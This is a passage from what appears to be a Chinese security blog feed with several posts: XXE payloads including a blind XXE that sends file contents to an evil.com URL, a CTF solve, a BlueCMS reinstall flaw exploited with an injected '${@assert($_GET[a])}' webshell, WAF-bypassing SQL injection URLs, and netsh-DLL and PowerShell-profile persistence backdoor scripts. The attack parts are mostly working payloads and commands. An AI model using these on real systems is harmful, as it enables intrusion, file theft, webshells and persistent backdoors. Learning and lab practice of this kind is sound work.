&quot;URI&quot;&gt;语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：实例演示：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ //定义一个外部名称    &lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt; // SYSTEM &quot;file:///xxxx&quot;用于读取文件&lt;foo&gt; //定义标签 标签名可以随便输入，也可以和外名称对应        &lt;value&gt;&amp;content;&lt;/value&gt; &lt;/foo&gt;得带Content-Type: application/xml头，如果请求头类似于：Content-Type: application/json，那么可以改为Content-Type: application/xml试试有没有xml漏洞</code></pre><h1 id="0x003实战XXE"><a href="#0x003实战XXE" class="headerlink" title="0x003实战XXE"></a>0x003实战XXE</h1><p>这里找来一道CTF的题，BWAPP搭建出来的XXE好像有问题。和文章用一样的操作得出来的结果不符合<br><img src="https://s2.ax1x.com/2019/11/27/QCoD1A.png" alt="QCoD1A.png"></p><p>题目地址：web.jarvisoj.com:9882<br><img src="https://s2.ax1x.com/2019/11/27/QCoWtg.png" alt="QCoWtg.png"></p><p>抓包一手得到发现是如下请求的<br><img src="https://s2.ax1x.com/2019/11/27/QCooXq.png" alt="QCooXq.png"></p><p>将<code>Content-Type</code>改为<code>Content-Type: application/xml</code>,发送以下内容探测是否存在XXE</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE sb [ &lt;!ENTITY xxe &quot;XXE Test&quot;&gt; //XXE Test是输出的内容 xxe可以为理解为一个变量 ]&gt;&lt;em&gt; //乱取个名就好  &amp;xxe; //理解为引用变量地址输出&lt;/em&gt; </code></pre><p><img src="https://s2.ax1x.com/2019/11/27/QCTKDP.png" alt="QCTKDP.png"></p><p>读取文件测试<br><img src="https://s2.ax1x.com/2019/11/27/QC7EZV.png" alt="QC7EZV.png"></p><p>读取flag文件<br><img src="https://s2.ax1x.com/2019/11/27/QC72WQ.png" alt="QC72WQ.png"></p><p>由于这里是py的环境没有办法测试更多</p><pre><code>HTTP/1.0 200 OKContent-Type: text/html; charset=utf-8Content-Length: 44Server: Werkzeug/0.9.4 Python/2.7.6Date: Wed, 27 Nov 2019 15:37:08 GMT&lt;em&gt;  CTF{XxE_15_n0T_S7range_Enough}&lt;/em&gt;</code></pre><p>这里就直接列出来</p><pre><code>ML文档是用PHP进行解析的，那么还可以使用php://filter协议来进行读取。&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY content SYSTEM &quot;php://filter/resource=c:/windows/win.ini&quot;&gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;content;&lt;/foo&gt;&lt;/root&gt;端口扫描加载外部DTD时有两种加载方式，一种为私有private，第二种为公共public。私有类型DTD加载：&lt;!ENTITY private_dtd SYSTEM &quot;DTD_location&quot;&gt;公共类型DTD加载：&lt;!ENTITY public_dtd PUBLIC &quot;DTD_name&quot; &quot;DTD_location&quot;&gt;在公共类型DTD加载的时候，首先会使用DTD_name来检索，如果无法找到，则通过DTD_location来寻找此公共DTD。利用DTD_location，在一定的环境下可以用来做内网探测。&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [    &lt;!ENTITY portscan SYSTEM &quot;http://localhost:3389&quot;&gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;portscan;&lt;/foo&gt;&lt;/root&gt;blind xxe漏洞:对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。利用DTD进行数据回显有时读取文件时没有回显，这时可以利用DTD参数实体的特性将文件内容拼接到url中，达到读取文件的效果。 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root[     &lt;!ENTITY % file SYSTEM &quot;php://fileter/convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;      &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.1.100:8000/evil.dtd&quot;&gt;     %dtd;      %send;]&gt; &lt;root&gt;&lt;/root&gt;evil.dtd &lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://evil.com/?content=%file;&#39;&gt;&quot;&gt; %payload;在evil.dtd中将%file实体的内容拼接到url后，然后利用burp等工具，查看url请求就能获得我们需要的内容</code></pre><h1 id="0x04参考链接"><a href="#0x04参考链接" class="headerlink" title="0x04参考链接"></a>0x04参考链接</h1><p><a href="https://www.cnblogs.com/vincebye/p/7199290.html" target="_blank" rel="noopener">https://www.cnblogs.com/vincebye/p/7199290.html</a><br><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/177979.html</a></p>]]></content>
      
      
        <tags>
            
            <tag> XXE漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>代码审计-文件重装漏洞</title>
      <link href="/posts/1f457874.html"/>
      <url>/posts/1f457874.html</url>
      <content type="html"><![CDATA[<h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>今天捞了一个CMS，打算学习一下代码审计。毕竟真正的大佬都会代码审计= =<br><img src="https://s2.ax1x.com/2019/11/26/QSHgr6.png" alt="QSHgr6.png"></p><h1 id="0x001环境"><a href="#0x001环境" class="headerlink" title="0x001环境"></a>0x001环境</h1><pre><code>PhpstudyCMS:bluecmsversion:1.6_sp1</code></pre><h1 id="0x02牛刀小试"><a href="#0x02牛刀小试" class="headerlink" title="0x02牛刀小试"></a>0x02牛刀小试</h1><p>下载好源码解压到WWW目录，安装的时候抓包</p><pre><code>POST /uploads/install/index.php?act=step4 HTTP/1.1Host: 127.0.0.1Content-Length: 180Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Referer: http://127.0.0.1/uploads/install/index.php?act=step3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=ckmi3slibob1f70ke38qesnae7Connection: closedbhost=localhost&amp;dbname=bluecms&amp;dbuser=root&amp;dbpass=root&amp;pre=blue_&amp;admin_name=admin&amp;admin_pwd=admin&amp;admin_pwd1=admin&amp;admin_email=fuck%40qq.com&amp;cookie_hash=LpAOf843D</code></pre><p>定位到/install/index.php</p><pre><code class="php">&lt;?php/* * [bluecms]版权所有 标准网络，保留所有权利 * This is not a freeware, use is subject to license terms * * $Id：index.php * $author：lucks */ #这几把站安装成功不会和你说安装成功了的 define(&#39;IN_BLUE&#39;, true); require_once(dirname(__FILE__) . &#39;/include/common.inc.php&#39;); if(file_exists(BLUE_ROOT.&#39;data/install.lock&#39;)){ #只判断了是否存在这个文件，然后输出了一句话，并没有退出，导致有重装漏洞     install_showmsg(&#39;您已经安装过本系统，如果想重新安装，请删除data目录下install.lock文件&#39;, &#39;../index.php&#39;); } $act = !empty($_REQUEST[&#39;act&#39;]) ? trim($_REQUEST[&#39;act&#39;]) : &#39;step1&#39;; if($act == &#39;step1&#39;){     $install_smarty-&gt;display(&#39;step1.htm&#39;); } elseif($act == &#39;step2&#39;){     $system_info = array();    $system_info[&#39;version&#39;] = BLUE_VERSION;    $system_info[&#39;os&#39;] = PHP_OS;    $system_info[&#39;ip&#39;] = $_SERVER[&#39;SERVER_ADDR&#39;];    $system_info[&#39;web_server&#39;] = $_SERVER[&#39;SERVER_SOFTWARE&#39;];    $system_info[&#39;php_ver&#39;] = PHP_VERSION;    $system_info[&#39;max_filesize&#39;] = ini_get(&#39;upload_max_filesize&#39;);     $dir_check = check_dirs($need_check_dirs);     install_template_assign(array(&#39;dir_check&#39;, &#39;system_info&#39;), array($dir_check, $system_info));     $install_smarty-&gt;display(&#39;step2.htm&#39;); } elseif($act == &#39;step3&#39;){     $cookie_hash = chr(mt_rand(ord(&#39;A&#39;),ord(&#39;Z&#39;))).chr(mt_rand(ord(&#39;a&#39;),ord(&#39;z&#39;))).chr(mt_rand(ord(&#39;A&#39;),ord(&#39;Z&#39;))).chr(mt_rand(ord(&#39;A&#39;),ord(&#39;Z&#39;))).chr(mt_rand(ord(&#39;a&#39;),ord(&#39;z&#39;))).mt_rand(1,9999).chr(mt_rand(ord(&#39;A&#39;),ord(&#39;Z&#39;)));     install_template_assign(array(&#39;cookie_hash&#39;),array($cookie_hash));     $install_smarty-&gt;display(&#39;step3.htm&#39;); } elseif($act == &#39;step4&#39;){     $dbhost = isset($_POST[&#39;dbhost&#39;]) ? trim($_POST[&#39;dbhost&#39;]) : &#39;&#39;;     $dbname = isset($_POST[&#39;dbname&#39;]) ? trim($_POST[&#39;dbname&#39;]) : &#39;&#39;;     $dbuser = isset($_POST[&#39;dbuser&#39;]) ? trim($_POST[&#39;dbuser&#39;]) : &#39;&#39;;     $dbpass = isset($_POST[&#39;dbpass&#39;]) ? trim($_POST[&#39;dbpass&#39;]) : &#39;&#39;;     $pre  = isset($_POST[&#39;pre&#39;]) ? trim($_POST[&#39;pre&#39;]) : &#39;blue_&#39;; //表前缀     $admin_name = isset($_POST[&#39;admin_name&#39;]) ? trim($_POST[&#39;admin_name&#39;]) : &#39;&#39;; //admin_name处没做任何效验，可能造成二次注入    $admin_pwd = isset($_POST[&#39;admin_pwd&#39;]) ? trim($_POST[&#39;admin_pwd&#39;]) : &#39;&#39;;    $admin_pwd1 = isset($_POST[&#39;admin_pwd1&#39;]) ? trim($_POST[&#39;admin_pwd1&#39;]) : &#39;&#39;;    $admin_email = isset($_POST[&#39;admin_email&#39;]) ? trim($_POST[&#39;admin_email&#39;]) : &#39;&#39;; //email处没做任何效验，可能造成二次注入    $cookie_hash = isset($_POST[&#39;cookie_hash&#39;]) ? trim($_POST[&#39;cookie_hash&#39;]) : &#39;&#39;;    if($dbhost == &#39;&#39; || $dbname == &#39;&#39;|| $dbuser == &#39;&#39;|| $admin_name == &#39;&#39;|| $admin_pwd == &#39;&#39; || $admin_pwd1 == &#39;&#39; || $admin_email == &#39;&#39;){        install_showmsg(&#39;您填写的信息不完整，请核对&#39;);    }    if($admin_pwd != $admin_pwd1){        install_showmsg(&#39;您两次输入的密码不一致&#39;);    }    if(!$db = @mysql_connect($dbhost, $dbuser, $dbpass)){        install_showmsg(&#39;连接数据库错误，请核对信息是否正确&#39;);    }    mysql_query(&quot;CREATE DATABASE IF NOT EXISTS `&quot;.$dbname.&quot;`;&quot;,$db);    $mysql_version = mysql_get_server_info($db);    if(!mysql_select_db($dbname)){        install_showmsg(&#39;选择数据库错误，请检查是否拥有权限或存在此数据库&#39;);    }    mysql_query(&quot;SET NAMES &#39;&quot;.BLUE_CHARSET.&quot;&#39;,character_set_client=binary,sql_mode=&#39;&#39;;&quot;,$db);    $content = &#39;&lt;?&#39;.&quot;php\n&quot;;    $content .= &quot;\$dbhost   = \&quot;$dbhost\&quot;;\n\n&quot;;    $content .= &quot;\$dbname   = \&quot;$dbname\&quot;;\n\n&quot;;    $content .= &quot;\$dbuser   = \&quot;$dbuser\&quot;;\n\n&quot;;    $content .= &quot;\$dbpass   = \&quot;$dbpass\&quot;;\n\n&quot;;    $content .= &quot;\$pre    = \&quot;$pre\&quot;;\n\n&quot;;    $content .= &quot;\$cookiedomain = &#39;&#39;;\n\n&quot;;    $content .= &quot;\$cookiepath = &#39;/&#39;;\n\n&quot;;    $content .= &quot;define(&#39;BLUE_CHARSET&#39;,&#39;&quot;.BLUE_CHARSET.&quot;&#39;);\n\n&quot;;    $content .= &quot;define(&#39;BLUE_VERSION&#39;,&#39;&quot;.BLUE_VERSION.&quot;&#39;);\n\n&quot;;    $content .= &#39;?&gt;&#39;;    $fp = @fopen(BLUE_ROOT . &#39;data/config.php&#39;, &#39;wb+&#39;);    if (!$fp){        install_showmsg(&#39;打开配置文件失败&#39;);    }    if (!@fwrite($fp, trim($content))){        install_showmsg(&#39;写入配置文件失败&#39;);    }    @fclose($fp);    $fp = @fopen(BLUE_ROOT . &#39;data/update_log.txt&#39;, &#39;wb+&#39;);    if(!$fp){        install_showmsg(&#39;打开更新日志文件失败&#39;);    }    if(!@fwrite($fp, BLUE_UPDATE_NO)){        install_showmsg(&#39;写入更新文件失败&#39;);    }    @fclose($fp);    if(!$fp = @fopen(dirname(__FILE__).&#39;/sql-structure.sql&#39;,&#39;rb&#39;)){        install_showmsg(&#39;打开文件sql-structure.sql出错，请检查文件是否存在&#39;);    }    $query = &#39;&#39;;    while(!feof($fp))    {        $line = rtrim(fgets($fp,1024));        if(preg_match(&#39;/;$/&#39;,$line))        {            $query .= $line.&quot;\n&quot;;            $query = str_replace(&#39;blue_&#39;,$pre,$query);            if ( $mysql_version &gt; 4.1 )            {                mysql_query(str_replace(&quot;TYPE=MyISAM&quot;, &quot;ENGINE=MyISAM  DEFAULT CHARSET=gbk&quot;,  $query), $db);            }            else            {                mysql_query($query, $db);            }            $query=&#39;&#39;;         }         else if(!ereg(&#39;/^(//|--)/&#39;,$line))         {             $query .= $line;         }    }    @fclose($fp);    $query = &#39;&#39;;    if(!$fp = @fopen(dirname(__FILE__).&#39;/sql-data.sql&#39;,&#39;rb&#39;)){        install_showmsg(&#39;打开文件sql-data.sql出错，请检查文件是否存在&#39;);    }    while(!feof($fp)){         $line = rtrim(fgets($fp,1024));         if(ereg(&quot;;$&quot;,$line)){             $query .= $line;            $query = str_replace(&#39;blue_&#39;,$pre,$query);            mysql_query($query,$db);            $query=&#39;&#39;;         }         else if(!ereg(&quot;^(//|--)&quot;,$line)){            $query .= $line;         }    }    fclose($fp);    $site_url = &quot;http://&quot;.$_SERVER[&#39;SERVER_NAME&#39;].substr(dirname($php_self), 0, -8);    mysql_query(&quot;UPDATE `&quot;.$pre.&quot;config` SET value = &#39;&quot;.$cookie_hash.&quot;&#39; WHERE name = &#39;cookie_hash&#39;&quot;, $db);    mysql_query(&quot;UPDATE `&quot;.$pre.&quot;config` SET value = &#39;&quot;.$site_url.&quot;&#39; WHERE name = &#39;site_url&#39;&quot;, $db);    mysql_query(&quot;INSERT INTO `&quot;.$pre.&quot;admin` (admin_id, admin_name, email, pwd, purview, add_time, last_login_time, last_login_ip) VALUES (1, &#39;$admin_name&#39;, &#39;$admin_email&#39;, md5(&#39;$admin_pwd&#39;), &#39;all&#39;, &#39;$timestamp&#39;, &#39;$timestamp&#39;, &#39;&#39;)&quot;, $db);    mysql_query(&quot;INSERT INTO &quot;.$pre.&quot;user (user_id, user_name, pwd, email, birthday, sex, money, face_pic, mobile_phone, home_phone, office_phone, qq, msn, address, reg_time, last_login_time, last_login_ip) VALUES (1, &#39;$admin_name&#39;, md5(&#39;$admin_pwd&#39;), &#39;$admin_email&#39;, &#39;0000-00-00&#39;, 0, &#39;0.00&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;$timestamp&#39;, &#39;$timestamp&#39;, &#39;&#39;)&quot;, $db);    header(&#39;Location:index.php?act=step5&#39;); }elseif($act == &#39;step5&#39;){    define(&#39;IN_BLUE&#39;, TRUE);    include dirname(__FILE__) . &#39;/../include/common.inc.php&#39;;    include BLUE_ROOT . &#39;admin/include/common.fun.php&#39;;    update_data_cache();    update_pay_cache();    if(is_writable(BLUE_ROOT.&#39;data/&#39;))    {        $fp = @fopen(BLUE_ROOT.&#39;data/install.lock&#39;, &#39;wb+&#39;);        fwrite($fp, &#39;OK&#39;);        fclose($fp);    }     $install_smarty-&gt;display(&#39;step5.htm&#39;);}?&gt;</code></pre><p>漏洞点出现在14行</p><pre><code class="php"> if(file_exists(BLUE_ROOT.&#39;data/install.lock&#39;)){ #只判断了是否存在这个文件，然后输出了一句话，并没有退出，导致有重装漏洞    install_showmsg(&#39;您已经安装过本系统，如果想重新安装，请删除data目录下install.lock文件&#39;, &#39;../index.php&#39;); }</code></pre><p>判断完没有马上exit()退出，导致程序可以继续执行。可以无限重装<br>GIF<br><img src="https://s2.ax1x.com/2019/11/26/QSqNAU.gif" alt="QSqNAU.gif"></p><p>尝试加入双引号想逃逸出双引号来写shell，发现被过滤了<br><img src="https://s2.ax1x.com/2019/11/26/QSq4gA.png" alt="QSq4gA.png"></p><p>后面想了半天没想懂。。看了一下别的文章发现是common.inc.php在作祟<br><img src="https://s2.ax1x.com/2019/11/26/QSLV29.png" alt="QSLV29.png"></p><p>addslashes()过滤掉了特殊字符，后面经过青鸟表哥的一波指点</p><pre><code>${@assert($_GET[a])}</code></pre><p>就可以做shell来使用了，至于为什么自己试<code>assert($_GET[_])</code>不行，我也不清楚= =</p><pre><code>POST /uploads/install/index.php?act=step4 HTTP/1.1Host: 127.0.0.1Content-Length: 180Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Referer: http://127.0.0.1/uploads/install/index.php?act=step3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=ckmi3slibob1f70ke38qesnae7Connection: closedbhost=localhost&amp;dbname=bluecms&amp;dbuser=root&amp;dbpass=root&amp;pre=${@assert($_GET[a])}&amp;admin_name=admin&amp;admin_pwd=admin&amp;admin_pwd1=admin&amp;admin_email=fuck%40qq.com&amp;cookie_hash=LpAOf843D</code></pre><p>最后结果<br><img src="https://s2.ax1x.com/2019/11/26/QSOpzd.png" alt="QSOpzd.png"></p><h1 id="0x03参考链接"><a href="#0x03参考链接" class="headerlink" title="0x03参考链接"></a>0x03参考链接</h1><p><a href="http://www.fly63.com/article/detial/2506" target="_blank" rel="noopener">PHP中双引号引起的命令执行漏洞</a></p>]]></content>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bypass安全狗注入-再见篇</title>
      <link href="/posts/9d8606fc.html"/>
      <url>/posts/9d8606fc.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1372563872&auto=1&height=66"></iframe><p>很久之前弄过狗，好像没弄过。那么在来弄弄这够吧，让其从一只狗变成一只二哈。奇妙的比喻<br><img src="https://s2.ax1x.com/2019/11/14/MUQNee.png" alt="MUQNee.png"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.secpulse.com/archives/109577.html" target="_blank" rel="noopener">【思路/技术】某大佬的BypassWAF新思路（附脚本） - SecPulse.COM | 安全脉搏</a></p><h1 id="开打"><a href="#开打" class="headerlink" title="开打"></a>开打</h1><p>安全狗的版本<br><img src="https://s2.ax1x.com/2019/11/14/MUQrSP.png" alt="MUQrSP.png"></p><p>常规的绕过：</p><pre><code>and 1=1和and 1=2被拦截Xor 1=1和Xor 1=2不拦截if((1=1),1,2)和if((1=2),1,2)不拦截</code></pre><p><img src="https://s2.ax1x.com/2019/11/14/MUQRoj.png" alt="MUQRoj.png"></p><p><img src="https://s2.ax1x.com/2019/11/14/MUQ7OU.png" alt="MUQ7OU.png"></p><p>order by以前使用<code>/**/OrDer/**/By/**/x</code>这样就可以过，现在不行了<br><img src="https://s2.ax1x.com/2019/11/14/MUlVfI.png" alt="MUlVfI.png"></p><p>后面使用上述文章的方法，现在还是能过的<br><img src="https://s2.ax1x.com/2019/11/14/MUlrN9.png" alt="MUlrN9.png"></p><pre><code>payload:/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0a</code></pre><p>上面的payload url解码后会变成<br><img src="https://s2.ax1x.com/2019/11/14/MUljHg.png" alt="MUljHg.png"><br>利用换行的方法跳过了注释</p><p>尝试使用文章的方法<br><img src="https://s2.ax1x.com/2019/11/14/MUlhHe.png" alt="MUlhHe.png"></p><pre><code>http://192.168.241.158/sql.php?id=0/**/union/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0aselect%201,user%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0a() </code></pre><p><img src="https://s2.ax1x.com/2019/11/14/MUlH3t.png" alt="MUlH3t.png"></p><p>这里发现version这个会被拦截，<code>@@version</code>，<code>version/**/()</code>,<code>version/**/(/**/)</code>,<code>(((VeRsiOn/**/(/**/))))</code>还是不行- -，带有关键字version并且在select后面就会被k<br><img src="https://s2.ax1x.com/2019/11/14/MU1ivV.png" alt="MU1ivV.png"></p><pre><code>http://192.168.241.158/sql.php?id=0/**/union/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0aselect%201,table_name/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0afrom/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0ainformation_schema.tables/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0awhere/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0atable_schema=%22tests%22</code></pre><p><img src="https://s2.ax1x.com/2019/11/14/MUYMn0.png" alt="MUYMn0.png"></p><p><img src="https://s2.ax1x.com/2019/11/14/MUYc3d.png" alt="MUYc3d.png"></p><p>这里开了information_schema数据库保护还是没法绕过的（默认关闭）<br><img src="https://s2.ax1x.com/2019/11/14/MUYwB6.md.png" alt="MUYwB6.md.png"></p><pre><code>http://192.168.241.158/sql.php?id=0/**/union/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0aselect%201,username/**/%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0afrom/**/users</code></pre><p><img src="https://s2.ax1x.com/2019/11/14/MUY2jI.png" alt="MUY2jI.png"></p><p>报错注入绕过</p><pre><code>updatexml() 不拦截updatexml(1,,1) 不拦截updatexml(1,concat,1) 拦截updatexml/**/#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (1,concat,1) 不拦截/**/and/**/updatexml/**/#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (1,concat(0x7e,(select/**/user/**/#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ()),0x7e),1) 不拦截</code></pre><p><img src="https://s2.ax1x.com/2019/11/15/MUNXkT.png" alt="MUNXkT.png"></p><p>附bypass waf脚本<br><img src="https://s2.ax1x.com/2019/11/15/MUUNcj.md.png" alt="MUUNcj.md.png"></p><p><a href="https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/%E8%87%AA%E5%8A%A8%E5%8C%96bypass_waf" target="_blank" rel="noopener">note/自己写的工具/自动化bypass_waf at master · 422926799/note · GitHub</a></p>]]></content>
      
      
        <tags>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>netsh后门</title>
      <link href="/posts/b31575cf.html"/>
      <url>/posts/b31575cf.html</url>
      <content type="html"><![CDATA[<blockquote><p>Netsh是Windows实用程序，管理员可以使用它来执行与系统的网络配置有关的任务，并在基于主机的Windows防火墙上进行修改。可以通过使用DLL文件来扩展Netsh功能。此功能使红色团队可以使用此工具来加载任意DLL，以实现代码执行并因此实现持久性。但是，此技术的实现需要本地管理员级别的特权。</p></blockquote><p>通过msfvenom生成一个dll</p><pre><code>msfvenom -p widnows/x64/exec CMD=calc.exe -f dll &gt; test.dll</code></pre><p><img src="https://s2.ax1x.com/2019/11/08/Mei1yV.png" alt="Mei1yV.png"></p><p>在受害机执行</p><pre><code>netsh add helper &lt;DLL_PATH&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/11/08/MeiUY9.png" alt="MeiUY9.png"></p><p>之后netsh一运行就会加载DLL（加载完DLL后自动运行netsh，关闭之后。再此之后执行的netsh都会加载dll）<br><img src="https://s2.ax1x.com/2019/11/08/MeiwS1.png" alt="MeiwS1.png"></p><p>如果要实现启动系统自动运行netsh，得修改注册表</p><pre><code> reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Pentestlab /t REG_SZ /d &quot;C:\Windows\SysWOW64\netsh&quot;; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run\\ -v pentestlab -d &#39;C:\Windows\SysWOW64\netsh&#39;;</code></pre><p>这里我用powershell实现了一个简单的功能</p><pre><code class="powershell"> param (    [string]$path = &quot;NULL&quot; ) if($path -eq &quot;NULL&quot;){    Write-Host &quot;netsh.ps1 -path &lt;DLL_path&gt;&quot;;    exit(0); }else{    write-host &quot;[*] reboot run netsh&quot;;    reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Pentestlab /t REG_SZ /d &quot;C:\Windows\SysWOW64\netsh&quot;;    reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run\\ -v pentestlab -d &#39;C:\Windows\SysWOW64\netsh&#39;;    netsh add helper $path;}</code></pre><p><img src="https://s2.ax1x.com/2019/11/08/Mei0Qx.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Powershell配置文件-持久性后门</title>
      <link href="/posts/3327c145.html"/>
      <url>/posts/3327c145.html</url>
      <content type="html"><![CDATA[<p>powershell配置文件后门，通过设置配置文件后门可以实现每次powershell启动时。执行指定的恶意操作<br><img src="https://s2.ax1x.com/2019/11/07/MkN7Yq.png" alt="MkN7Yq.png"></p><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><pre><code class="powershell">echo $profile #输出配置文件的路径Test-Path $profile #判断配置文件是否存在，如果返回为False代表不存在，返回True则存在New-Item -Path $profile -Type File –Force #新建一个配置文件$string = &#39;Start-Process &quot;C:\tmp\pentestlab.exe&quot;&#39; #要启动的恶意程序$string | Out-File -FilePath &quot;C:\Users\&lt;User&gt;\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1&quot; -Append  #写入配置文件</code></pre><p><img src="https://s2.ax1x.com/2019/11/07/MkUl1f.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/11/07/MkUahq.png" alt="MkUahq.png"></p><p>测试结果<br><img src="https://s2.ax1x.com/2019/11/07/MkU03V.gif" alt="MkU03V.gif"></p><p>自动写入的ps1脚本</p><pre><code class="powershell">Write-Host -NoNewline [*] New powershell config;New-Item -Path $profile -Type File –Force;$path=$profile;Write-Host [*] config path: $path;$sets=Test-Path $profile;if($sets -eq &quot;True&quot;){    Write-Host [*] New config ok;    $payload=&#39;Start-Process &quot;C:\Windows\System32\notepad.exe&quot;&#39;    $payload | Out-File -FilePath $path;    Write-Host [+] write powershell config ok !!!}else{    Write-Host -NoNewline [-] New config False...;    exit(1);}</code></pre><p><img src="https://s2.ax1x.com/2019/11/07/MkrEG9.gif" alt=""></p><p>当然你也可以用这个方法来实现无文件攻击</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://pentestlab.blog/2019/11/05/persistence-powershell-profile/" target="_blank" rel="noopener">Persistence – PowerShell Profile | Penetration Testing Lab</a></p>]]></content>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Vulnhub:Broken</title>
      <link href="/posts/344f3de9.html"/>
      <url>/posts/344f3de9.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=3&id=1369707436&auto=1&height=66"></iframe><p>这个星期继续做Vulnhub，先把简单-中等的题给捞完。其实还是能捞到不少骚操作的<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kv7ftxc0j30s40fp7fs.jpg" alt="006LG7Nygy1g8kv7ftxc0j30s40fp7fs.jpg"></p><p>题目下载地址：<a href="https://www.vulnhub.com/entry/broken-gallery,344/" target="_blank" rel="noopener">Broken: Gallery ~ VulnHub</a><br>作者在制作这个靶机的时候，VM虚拟机版本偏高。如果出现VM版本不兼容的情况下，请修改<code>VMX</code>里的</p><pre><code>virtualHW.version = &quot;&lt;你的VM虚拟机版本&gt;&quot;</code></pre><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>寻找靶机的IP</p><pre><code>fping -ag 192.168.1.0/24 &gt; test.txt</code></pre><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kvclcyelj30a304lmx1.jpg" alt="006LG7Nygy1g8kvclcyelj30a304lmx1.jpg"></p><p>最后确认192.168.1.108是靶机IP<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kvd5nswej30lc0cmgmv.jpg" alt="006LG7Nygy1g8kvd5nswej30lc0cmgmv.jpg"></p><p>由于是题目是要你从目录遍历里的文件获取进入系统的方法，就没必要跑目录了</p><p>nmap扫一波端口（开了80和22）<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kvk0ulxyj30oh06dmxz.jpg" 